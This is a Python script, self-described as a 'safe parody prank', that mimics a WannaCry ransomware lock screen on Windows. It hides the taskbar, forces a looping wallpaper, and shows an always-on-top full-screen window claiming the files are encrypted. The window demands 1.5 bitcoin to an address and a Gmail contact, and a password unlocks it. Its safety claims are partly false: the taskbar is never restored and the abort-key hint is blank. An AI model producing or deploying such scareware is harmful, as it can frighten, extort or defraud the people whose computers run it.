#!/usr/bin/env python3
"""
Safe parody prank:
- Changes wallpaper (loops every 3s)
- Shows a borderless always-on-top parody window with a password box
- Enter the correct password to restore wallpaper, stop sound, and exit
- Emergency abort: Ctrl+Alt+Shift+Q (restores wallpaper and quits)
- Does NOT encrypt or modify user files
- Windows-only (uses winreg/SystemParametersInfoW)
"""

import tkinter as tk
import threading
import ctypes
import winreg
import time
import os
import sys
import ctypes
from ctypes import wintypes

# Define the necessary constants and functions
SW_HIDE = 0
SW_SHOW = 5

# Load the user32 and kernel32 libraries
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Find the taskbar window
hwnd = user32.FindWindowW("Shell_TrayWnd", None)

# Hide the taskbar window
user32.ShowWindow(hwnd, SW_HIDE)

# Optional sound (install pygame if you want sound)
try:
    from pygame import mixer
    PYGAME_AVAILABLE = True
except Exception:
    PYGAME_AVAILABLE = False

# ---------------- CONFIG ----------------
PASSWORD = "Xy7Lz29#AbC15"                 # change to your desired unlock password
WALLPAPER_IMAGE = "background.png"# image file placed next to script
SOUND_FILE = "creepymusic.mp3"           # optional sound file (looped) - place next to script
REAPPLY_INTERVAL = 3                # seconds between reapplying wallpaper
TIMER_SECONDS = 3600                # initial countdown shown (not required)
# ----------------------------------------

def get_current_wallpaper():
    """Read current wallpaper from registry (Windows)."""
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop") as key:
            path, _ = winreg.QueryValueEx(key, "WallPaper")
            return path
    except Exception:
        return ""

def set_wallpaper(path):
    """Set wallpaper using Windows API."""
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except Exception as e:
        print("Failed to set wallpaper:", e)

def wallpaper_loop(stop_event, abs_path):
    """Continuously reapply wallpaper until stop_event is set."""
    while not stop_event.is_set():
        set_wallpaper(abs_path)
        # Sleep in small increments so exit is responsive
        for _ in range(int(REAPPLY_INTERVAL * 10)):
            if stop_event.is_set():
                break
            time.sleep(0.1)

def play_sound_loop(stop_event, sound_path):
    """Play sound loop using pygame mixer if available."""
    if not PYGAME_AVAILABLE:
        return
    try:
        mixer.init()
        mixer.music.load(sound_path)
        mixer.music.play(-1)  # loop forever
        while not stop_event.is_set():
            time.sleep(0.2)
    except Exception as e:
        print("Sound error:", e)
    finally:
        try:
            mixer.music.stop()
            mixer.quit()
        except Exception:
            pass

def safe_exit(root, stop_event, original_wallpaper):
    """Restore wallpaper, stop threads, stop sound, and close window."""
    stop_event.set()
    # try restore original wallpaper
    try:
        if original_wallpaper:
            set_wallpaper(original_wallpaper)
    except Exception:
        pass
    # if pygame running, stop it
    if PYGAME_AVAILABLE:
        try:
            mixer.music.stop()
            mixer.quit()
        except Exception:
            pass
    try:
        root.destroy()
    except Exception:
        pass

def center_window(root, width, height):
    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()
    x = (sw - width) // 2
    y = (sh - height) // 2
    root.geometry(f"{width}x{height}+{x}+{y}")

def main():
    # Ensure we're on Windows
    if os.name != "nt":
        print("This script is Windows-only (uses Windows wallpaper APIs).")
        return

    # Check image exists
    wallpaper_path = os.path.abspath(WALLPAPER_IMAGE)
    if not os.path.exists(wallpaper_path):
        print(f"ERROR: wallpaper image not found: {wallpaper_path}")
        return

    # get original wallpaper so we can restore it
    original_wallpaper = get_current_wallpaper()
    print("Original wallpaper:", original_wallpaper)

    # Prepare stop event for threads
    stop_event = threading.Event()

    # Start wallpaper loop thread
    wp_thread = threading.Thread(target=wallpaper_loop, args=(stop_event, wallpaper_path), daemon=True)
    wp_thread.start()

    # Optionally start sound thread if file exists and pygame available
    sound_thread = None
    if os.path.exists(SOUND_FILE) and PYGAME_AVAILABLE:
        sound_thread = threading.Thread(target=play_sound_loop, args=(stop_event, os.path.abspath(SOUND_FILE)), daemon=True)
        sound_thread.start()
    elif os.path.exists(SOUND_FILE) and not PYGAME_AVAILABLE:
        print("Sound file present but pygame not available. Install pygame to enable sound: pip install pygame")

    # Build the window UI
    root = tk.Tk()
    root.title("WannaCry 1.0")
    root.configure(bg="#b20b0b")

    # Borderless (looks locked). Note: user can still kill process via Task Manager.
    root.overrideredirect(True)
    root.attributes("-topmost", True)

    # Bind an emergency abort combo (Ctrl+Alt+Shift+Q) for safety
    def emergency_abort(event=None):
        print("Emergency abort pressed. Restoring wallpaper and exiting.")
        safe_exit(root, stop_event, original_wallpaper)
    root.bind_all("<Control-Alt-Shift-q>", emergency_abort)
    root.bind_all("<Control-Alt-Shift-Q>", emergency_abort)

    # Window size & center
    WIN_W, WIN_H = 1920, 1080
    center_window(root, WIN_W, WIN_H)

    # Header area
    header = tk.Label(root, text="Ooops, your important files are encrypted.", bg="#b20b0b", fg="white", font=("Segoe UI", 20, "bold"))
    header.pack(pady=(80,0))

    # Left panel (lock & timer)
    left = tk.Frame(root, bg="#7a0a0a", width=280, height=420)
    left.place(x=525, y=380)

    lock_lbl = tk.Label(left, text="🔐", bg="#7a0a0a", fg="white", font=("Segoe UI", 150))
    lock_lbl.pack(pady=10)

    timer_lbl = tk.Label(left, text="00:00:00", bg="#7a0a0a", fg="white", font=("Consolas", 34))
    timer_lbl.pack(pady=18)

    # Right text panel
    right = tk.Frame(root, bg="#b20b0b")
    right.place(x=933, y=335)

    info = tk.Text(right, width=54, height=22, bg="#f3dcdc", fg="black", wrap="word", font=("Segoe UI", 13))
    info.pack()
    info.insert("1.0",
                "WHAT HAPPEND TO MY PC?\n\n"
                "all your files are locked on this pc and they are not usable for now.\n\n"
                "WILL I GET MY FILES BACK?\n\n"
                "yes,but only if you pay us 1.5 bitcoin,if you don't pay your pc will become unusable.\n\n"
                "if you want your files back send 1.5 bitcoin to this bitcoin adress:pzjHfrt4Rvhk90Zcy and type in the password that this gmail adress will send you:f.909.o676@gmail.com")
    info.config(state="disabled")

    # Password entry and unlock button
    entry_frame = tk.Frame(root, bg="#b20b0b")
    entry_frame.place(x=320, y=800)

    pw_label = tk.Label(entry_frame, text="Enter password to unlock:", bg="#b20b0b", fg="white", font=("Segoe UI", 11))
    pw_label.grid(row=0, column=0, padx=(0,8))

    pw_var = tk.StringVar()
    pw_entry = tk.Entry(entry_frame, textvariable=pw_var, show="*", width=24, font=("Segoe UI", 15))
    pw_entry.grid(row=0, column=1)
    pw_entry.focus_set()

    feedback = tk.Label(entry_frame, text="", bg="#b20b0b", fg="white")
    feedback.grid(row=1, column=0, columnspan=2, pady=(6,0))

    def try_unlock(event=None):
        val = pw_var.get()
        if val == PASSWORD:
            feedback.config(text="Password correct.", fg="#b7f0b7")
            # restore and exit
            safe_exit(root, stop_event, original_wallpaper)
        else:
            feedback.config(text="Incorrect password. Try again.", fg="#ffd5d5")
            pw_var.set("")
            pw_entry.focus_set()

    unlock_btn = tk.Button(entry_frame, text="UNLOCK", command=try_unlock, font=("Segoe UI", 11, "bold"))
    unlock_btn.grid(row=0, column=2, padx=(8,0))

    # Optionally show a small note with the emergency combo so you don't lock yourself out
    note = tk.Label(root, text="", bg="#b20b0b", fg="#f3e6e6", font=("Segoe UI", 9, "italic"))
    note.place(x=320, y=500)

    # Countdown timer (visual only)
    remaining = TIMER_SECONDS
    def tick():
        nonlocal remaining
        if remaining > 0:
            remaining -= 1
        hrs = remaining // 3600
        mins = (remaining % 3600) // 60
        sec = remaining % 60
        timer_lbl.config(text=f"{hrs:02d}:{mins:02d}:{sec:02d}")
        root.after(1000, tick)
    tick()

    # When window is closed normally, ensure restore
    def on_close_attempt():
        # This normally won't be triggered for overrideredirect windows,
        # but keep for safety.
        safe_exit(root, stop_event, original_wallpaper)
    root.protocol("WM_DELETE_WINDOW", on_close_attempt)

    # Start the Tk loop
    try:
        root.mainloop()
    except KeyboardInterrupt:
        # If interrupted in terminal, restore wallpaper
        safe_exit(root, stop_event, original_wallpaper)

if __name__ == "__main__":
    main()
